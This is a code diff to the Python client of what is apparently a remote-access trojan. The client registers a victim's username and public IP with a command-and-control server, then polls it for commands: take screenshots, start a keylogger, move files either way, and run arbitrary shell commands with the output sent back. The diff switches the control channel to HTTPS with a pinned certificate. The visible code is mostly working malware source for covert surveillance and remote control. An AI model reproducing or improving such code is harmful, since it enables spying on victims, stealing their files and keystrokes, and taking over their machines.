@@ -6,7 +6,7 @@ import os
 import json
 import mss
 
-SERVER_URL = "http://127.0.0.1:5000"  # Change to your actual server URL later
+SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later
 
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
 CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
@@ -24,7 +24,7 @@ def get_username():
 def get_public_ip():
     try:
         # Use an external API to get the public IP address
-        response = requests.get("https://api.ipify.org?format=json")
+        response = requests.get("https://api.ipify.org?format=json", verify='cert.pem')
         if response.status_code == 200:
             public_ip = response.json().get("ip")
             return public_ip
@@ -38,7 +38,7 @@ def get_public_ip():
 # Function to check if the server URL is active
 def is_server_url_active(url):
     try:
-        response = requests.get(url, timeout=5)
+        response = requests.get(url, timeout=5, verify='cert.pem')
         if response.status_code == 200:
             print("Server is active and reachable.")
             return True
@@ -97,7 +97,7 @@ def register_client():
 
     try:
         # Send a POST request to the /clientRegistration endpoint
-        response = requests.post(f"{SERVER_URL}/api/clientRegistration", json=registration_data)
+        response = requests.post(f"{SERVER_URL}/api/clientRegistration", json=registration_data, verify='cert.pem')
 
         if response.status_code == 201:
             # Server response contains the client_id
@@ -157,7 +157,7 @@ else:
 while True:
     try:
         # Fetch command from the server every 5 seconds
-        response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}", timeout=5)  # Set timeout for the request
+        response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}", timeout=5, verify='cert.pem')  # Set timeout for the request
         
         # Check if the response status is OK
         if response.status_code == 200:
@@ -167,7 +167,7 @@ while True:
                 with mss.mss() as sct:
                     screenshot = sct.grab(sct.monitors[1])  # Capture the primary monitor
                     response = requests.post(f"{SERVER_URL}/api/screenshot", files={"file": ("screenshot.png", mss.tools.to_png(screenshot.rgb, screenshot.size))},data={"client_id": client_id}  # Include client_id in the request
-                )
+                , verify='cert.pem')
                 print(response.text)  # Print the API response
                 command = ""
             elif command.strip == "start_keylog":
@@ -185,7 +185,7 @@ while True:
                 filename = command_data["filename"]
                 command=""
                 # Send request to server
-                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&filename={filename}", timeout=5)
+                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&filename={filename}", timeout=5, verify='cert.pem')
 
                 # Check if the response is successful
                 if response.status_code == 200:
@@ -205,7 +205,7 @@ while True:
                 command=""
                 client_id = command_data["client_id"]
                 server_file_path_for_client = command_data["server_file_path"]
-                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5)
+                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5, verify='cert.pem')
                 # Check if the response is successful
                 if response.status_code == 200:
                     filename = os.path.basename(server_file_path_for_client)
@@ -236,7 +236,7 @@ while True:
                 try:
                     with open(full_file_path, 'rb') as file:
                         files = {'file': (os.path.basename(full_file_path), file)}
-                        response = requests.post(f'{SERVER_URL}/api/download-files-from-client', files=files)
+                        response = requests.post(f'{SERVER_URL}/api/download-files-from-client', files=files, verify='cert.pem')
                         print(response.text)
                 except Exception as e:
                     print(f"Error sending file: {e}")
@@ -249,7 +249,7 @@ while True:
                 result = execute_command(command)
                 
                 # Send the result back to the server
-                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client", json={"command":command, "result": result, "client_id":client_id})
+                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client", json={"command":command, "result": result, "client_id":client_id}, verify='cert.pem')
                 
                 # Check if the result was successfully sent
                 if result_response.status_code != 200:
